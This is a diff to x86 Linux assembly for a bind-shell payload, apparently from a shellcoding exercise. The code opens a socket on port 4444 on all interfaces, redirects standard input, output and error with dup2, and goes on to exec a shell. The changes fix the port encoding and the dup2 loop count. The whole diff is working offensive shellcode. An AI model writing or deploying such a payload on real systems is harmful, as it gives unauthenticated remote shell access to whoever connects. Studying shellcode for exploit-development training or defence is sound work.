@@ -10,6 +10,7 @@ _start:
     xor eax, eax
     mov ebx, eax
     mov ecx, eax
+    mov edi, eax
 
 socket:
     ; ====================================================================================================
@@ -49,8 +50,8 @@ bind:
     
     mov al, 0x66 ; 102 sys_socketcall - eax was overwritten by the file descriptor
 
-    ; SYS_BIND 0x2 
-    pop ebx
+    ; SYS_BIND 0x2
+    pop ebx  
     pop edi
 
     ;struct sockaddr_in {
@@ -62,14 +63,7 @@ bind:
     xor edx, edx ; xor out edx
     push edx ; struct in_addr 0.0.0.0
 
-    ; in_port_t - sin_port
-    ; $ python3 
-    ; >>> import struct
-    ; >>> struct.pack('<L', 4444)[0:2]
-    ; >>> b'\\\x11'
-    ; REPLACE IF YOU WANT TO CHANGE PORT
-    
-    push word 0x11; port in network (big) endian format
+    push word 0x5c11; port 4444 in network endian format
     push word bx ; 0x2, sin_family - AF_INET- bx same value as SYS_BIND
     push byte 16 ; socketlen_t addrlen 16 bit
     push ecx ; push sockaddr pointer to ecx
@@ -130,7 +124,7 @@ dup2:
     mov al, 0x3f ; int dup2 - 63 in hex
     int 0x80 ; dup2 syscall
     inc cl ; increment loop register
-    cmp ecx, 0x4 ; compare ecx 0x4 
+    cmp ecx, 0x3 ; compare ecx 0x3 
     jne dup2 ; if ecx != 4 continue looping
 
 execsh:
